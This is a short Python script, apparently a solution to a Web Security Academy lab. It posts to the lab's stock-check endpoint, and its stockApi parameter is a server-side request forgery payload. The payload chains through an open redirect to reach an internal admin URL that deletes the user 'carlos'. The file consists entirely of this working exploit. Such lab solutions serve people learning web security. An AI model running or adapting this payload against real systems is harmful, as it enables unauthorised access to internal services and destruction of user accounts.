import requests

stock_url = 'https://ac1c1f971e17aea4c024310400b400fd.web-security-academy.net/product/stock'

stockapi_data = {
    'stockApi' : '/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos'
}
resp = requests.post(stock_url, data=stockapi_data)